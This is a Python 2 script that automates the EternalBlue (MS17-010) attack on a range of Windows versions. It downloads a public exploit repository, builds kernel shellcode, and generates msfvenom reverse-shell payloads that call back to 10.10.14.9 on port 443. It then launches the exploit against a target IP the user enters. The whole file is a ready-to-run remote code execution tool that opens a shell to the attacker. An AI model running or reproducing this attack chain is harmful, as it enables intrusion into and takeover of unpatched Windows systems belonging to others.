import time
import threading
from git import Repo
import subprocess
import os
import sys

#MS17-010 exploit
# open nc liestener on 443
#run this script once, if u didnt a shell it means the system need to restart so execute again after a minute


IP=raw_input("enter target IP  " )
def version():
    print "\n\n\n"
    print "for windows:"
    print "Windows Server 2008 & R2"
    print "Windows Server 2012 & R2 (x86)"
    print "Windows Server 2016 (x64)"
    print "Windows Vista"
    print "Windows 7"
    print ""
    print "press 1"
    print ""
    print "for windows:" 
    print "Windows Server 2012 (x64)"
    print "Windows 8.1 & RT"
    print "Windows 10 (x64) (build < 14393)"
    print ""

    print "press 2"
    print ""
    print "\n"

    ver=input ("          press 1 or 2:  " )
    print ver

    if ver==1 or ver==2:
	global vers
	vers=ver
    else:
	print "wrong version"
        print(type(ver))
        sys.exit(0)
	



if os.path.isdir('./MS17-010') is True:
    print " The folder exists already"
else:
    print "downloadig EXPLOIT....."
    s=1
    while s==1:
        s=Repo.clone_from("https://github.com/worawit/MS17-010.git", "MS17-010")
	print s




def msfven64():
    print "creating payload from msfvenom, will take 8 seconds avg..."
    bashCommand = " msfvenom -p windows/x64/shell_reverse_tcp LPORT=443 LHOST=10.10.14.9 --platform windows -a x64 --format raw -o sc_x64_payload.bin"
    process = subprocess.Popen(bashCommand.split(), stdout=subprocess.PIPE)
    output, error = process.communicate()




def nasm64():
    bashCommand = "nasm -f bin MS17-010/shellcode/eternalblue_kshellcode_x64.asm -o ./sc_x64_kernel.bin"
    process = subprocess.Popen(bashCommand.split(), stdout=subprocess.PIPE)
    output, error = process.communicate()



def msfven86():
    print "creating 86 payload from msfvenom, will take 5 seconds avg..."
    bashCommand = "msfvenom -p windows/shell_reverse_tcp LPORT=443 LHOST=10.10.14.9 --platform windows -a x86 --format raw -o sc_x86_payload.bin"
    process = subprocess.Popen(bashCommand.split(), stdout=subprocess.PIPE)
    output, error = process.communicate()




def nasm86():
    bashCommand = "nasm -f bin MS17-010/shellcode/eternalblue_kshellcode_x86.asm -o ./sc_x86_kernel.bin"
    process = subprocess.Popen(bashCommand.split(), stdout=subprocess.PIPE)
    output, error = process.communicate()
def createExploit():
    thread = threading.Thread(target=nasm64)
    thread.start()
    thread.join()
    thread = threading.Thread(target=msfven64)
    thread.start()
    thread.join()
    os.system("cat sc_x64_kernel.bin sc_x64_payload.bin > sc_x64.bin")
    thread = threading.Thread(target=nasm86)
    thread.start()
    thread.join()
    thread = threading.Thread(target=msfven86)
    thread.start()
    thread.join()
    os.system("cat sc_x86_kernel.bin sc_x86_payload.bin > sc_x86.bin")
    os.system("python MS17-010/shellcode/eternalblue_sc_merge.py sc_x86.bin sc_x64.bin sc_all.bin")

    


def main():
    version()
    if os.path.isfile('./sc_all.bin') is False:
        print " The exlpoit is being created"
        createExploit()
    print " The exploit already exist in the directory, executing now.."
    if vers is 1:
	subprocess.call(['python','MS17-010/eternalblue_exploit7.py',IP,'sc_all.bin'])
    else:
	subprocess.call(['python','MS17-010/eternalblue_exploit8.py',IP,'sc_all.bin'])





if __name__ == '__main__':
    main()

